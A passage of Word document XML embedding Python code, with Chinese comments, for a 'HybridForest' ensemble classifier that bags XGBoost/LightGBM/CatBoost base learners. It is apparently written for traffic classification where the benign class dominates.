      </w:r>
    </w:p>
    <w:p w14:paraId="36E1EE9B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            colsample_bytree=1.0,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="531FA09D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            n_jobs=n_jobs,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60004188">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            random_state=seed,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04C3D6A0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            verbose=-1,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FD11F23">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06CF2931">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        kw.update(overrides)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22423B9B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return LGBMClassifier(**kw)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CB30D67">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="01A11D5C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if kind == "catboost":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74FC7EE8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        from catboost import CatBoostClassifier</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62BB2E16">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="24496177">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        kw = dict(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CE5C25B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            iterations=rounds,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="765AB2BD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            depth=depth,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67FDBC7F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            learning_rate=0.1,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72E044C9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            rsm=1.0,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EC04D98">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            thread_count=n_jobs,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68EC962E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            random_seed=seed,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D46DEE9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            verbose=0,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26F550C6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            allow_writing_files=False,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D6732D4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CF17CB1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        kw.update(overrides)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C4C4547">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return CatBoostClassifier(**kw)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FAE318F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="33978B7E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    raise ValueError(f"不支持的基学习器类型：{kind!r}，可选 xgboost / lightgbm / catboost")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DE1F97D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="29D781E7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5E830500">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>class HybridForest(ClassifierMixin, BaseEstimator):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="279C3B38">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    """Bagging 骨架 + 随机抽取的提升器基学习器 + 软投票。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="670CD02F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4B71F3F6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    Parameters</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18F60D28">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ----------</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63CA2C08">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    n_estimators : int</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B9F4932">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        基学习器个数。每个都是一个完整的提升模型，不是一个棵。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="597D3018">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    max_depth : int</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13D244DF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        Bagging 骨架的深度护栏（对应随机森林的 24 层）。基学习器内部深度不得超过它。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="414712F1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    max_features : {"sqrt", "log2", "auto"} / int / float / None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="470648DF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        每个基学习器看到的随机特征子集大小，语义与随机森林一致。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="411DA90E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    base_depth : int</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45C7D545">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        提升器内部单棵浅树的深度，建议 3–8。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DEA5AB4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    base_rounds : int</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00F157E0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        提升轮数。多分类下每轮每类各长一棵树。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D760735">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    base_pool : sequence of str</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29420348">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        基学习器候选库，每个基学习器从中随机抽取一个。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30E06DA8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    base_overrides : dict[str, dict]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10DBEBEB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        按库名注入额外参数，例如 {"lightgbm": {"boosting_type": "dart", "drop_rate": 0.1}}。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E1A8761">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        这是 DART 消融实验的接入点。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2544C96E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    class_weight : {"balanced"} / dict / None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BB72B2F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        类别权重。BENIGN 占 80%，不处理会让模型退化成"全判正常"。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EF6283A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    random_state : int / None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="560B1595">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    n_jobs : int</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B9A27AA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        每个基学习器内部使用的线程数。基学习器之间是串行训练的，避免嵌套并行。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D4685D8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    """</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="429EDBC1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="768EAE3A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    def __init__(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DC06EA4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="205934B7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        n_estimators=24,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79D40831">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        max_depth=24,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30095227">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        max_features="sqrt",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12234F63">
